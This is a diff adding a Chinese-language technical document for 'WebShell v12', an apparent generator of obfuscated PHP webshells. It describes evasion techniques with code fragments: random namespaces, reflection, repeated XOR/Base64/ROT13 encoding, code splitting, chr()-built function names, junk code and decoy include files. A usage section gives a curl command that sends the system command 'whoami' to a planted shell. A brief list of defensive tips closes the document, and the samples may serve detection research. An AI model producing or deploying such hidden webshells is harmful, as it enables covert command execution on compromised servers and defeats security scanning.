@@ -1,0 +1,179 @@
+# WebShell v12 技术文档
+
+## 概述
+WebShell v12 是一个高度混淆的PHP WebShell生成器，使用了多种高级混淆技术来增加检测难度。本文档详细介绍了v12版本使用的各种技术。
+
+## 核心技术
+
+### 1. 命名空间隔离（Namespace Isolation）
+```php
+namespace {namespace};
+```
+- 使用随机生成的命名空间名
+- 将核心功能封装在独立命名空间中
+- 增加代码的隐蔽性，避免与其他代码冲突
+- 使用全局命名空间引用（\\）来访问系统类
+
+### 2. 魔术方法（Magic Methods）
+```php
+class Magic {
+    public function __construct($data) {...}
+    public function __call($name, $args) {...}
+}
+```
+- `__construct`: 构造函数，用于初始化对象
+- `__call`: 动态方法调用，当调用不存在的方法时触发
+- 这些方法使得代码执行更加动态和隐蔽
+
+### 3. PHP反射（Reflection）
+```php
+$class = new \\ReflectionClass('{namespace}\\Magic');
+$magic = $class->newInstance($d);
+```
+- 使用`ReflectionClass`动态创建类实例
+- 通过反射调用方法，避免直接调用
+- 增加代码分析的难度
+
+### 4. 多层编码（Multi-layer Encoding）
+```python
+# 多层编码
+encoded_payload = payload_code
+for _ in range(3):  # 多次编码
+    encoded_payload = xor_encode_base64(encoded_payload, KEY)
+    encoded_payload = rot13_encode(encoded_payload)
+```
+- ROT13编码：简单的字母替换
+- XOR加密：使用密钥进行异或运算
+- Base64编码：将二进制数据转换为可打印字符
+- 多层编码增加了解码的复杂度
+
+### 5. 代码分割和重组（Code Splitting and Reassembly）
+```python
+# 代码分割
+code_parts = split_code(encoded_payload)
+encoded_parts = [xor_encode_base64(part, KEY) for part in code_parts]
+```
+```php
+// 重组代码
+$p = '';
+foreach($parts as $part) {
+    $p .= XORDecode(base64_decode($part), $k);
+}
+```
+- 将代码分割成小块
+- 每块单独编码
+- 运行时重组，增加分析难度
+
+### 6. 动态函数名（Dynamic Function Names）
+```php
+$f1 = chr(99); // c
+$f2 = chr(114); // r
+...
+$fn = $f1.$f2.$f3.$f4.$f5.$f6.$f7.$f8.$f9.$f10.$f11.$f12.$f13.$f14.$f15;
+```
+- 使用`chr()`函数构造函数名
+- 避免直接出现敏感函数名
+- 增加静态分析的难度
+
+### 7. 垃圾代码（Junk Code）
+```python
+def generate_junk_code():
+    lines = []
+    for _ in range(random.randint(5, 10)):
+        var = generate_random_var()
+        val = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(5, 15)))
+        lines.append(f"${var} = '{val}';")
+    return '\n'.join(lines)
+```
+- 生成随机变量和值
+- 添加无意义的代码
+- 干扰代码分析
+
+### 8. 注释混淆（Comment Obfuscation）
+```python
+def generate_junk_comments():
+    comments = [
+        "// This is a normal comment",
+        "/* Regular code block */",
+        ...
+    ]
+    return random.choice(comments)
+```
+- 添加看似正常的注释
+- 增加代码的迷惑性
+- 干扰人工分析
+
+### 9. 伪装文件（Decoy Files）
+```php
+@include '{normal_file_name}';
+```
+- 创建看似正常的包含文件
+- 增加代码的隐蔽性
+- 干扰文件分析
+
+### 10. 执行流程混淆（Execution Flow Obfuscation）
+```php
+// 多层解码
+$d = $p;
+for($i=0; $i<3; $i++) {
+    $d = rot13_decode($d);
+    $d = XORDecode(base64_decode($d), $k);
+}
+```
+- 复杂的解码流程
+- 多层嵌套的执行过程
+- 增加动态分析的难度
+
+## 技术优势
+
+1. **静态分析防护**
+   - 多层编码和加密
+   - 动态函数名
+   - 代码分割
+   - 垃圾代码干扰
+
+2. **动态分析防护**
+   - 复杂的执行流程
+   - 反射和魔术方法
+   - 命名空间隔离
+   - 多层解码过程
+
+3. **隐蔽性增强**
+   - 伪装文件
+   - 正常注释
+   - 随机命名
+   - 代码结构混淆
+
+4. **随机性保证**
+   - 每次生成的代码都不同
+   - 随机函数名和变量名
+   - 随机垃圾代码
+   - 随机注释
+
+## 使用方法
+
+```bash
+# 生成WebShell样本
+python gen_php_webshellv12.py
+
+# 使用WebShell
+curl -X POST http://target/adv_webshell_40.php -d "qaxniubi=whoami"
+```
+
+## 注意事项
+
+1. 所有生成的WebShell都保存在 `/data/php_webshellv12` 目录下
+2. 每个WebShell都包含一个对应的伪装文件
+3. 参数名固定为 `qaxniubi`
+4. 默认生成100个样本
+
+## 防御建议
+
+1. 加强文件上传检测
+2. 监控异常文件包含
+3. 检查可疑的命名空间
+4. 分析异常的反射调用
+5. 监控系统命令执行
+6. 检查多层编码特征
+7. 分析代码结构异常
+8. 监控文件修改行为 
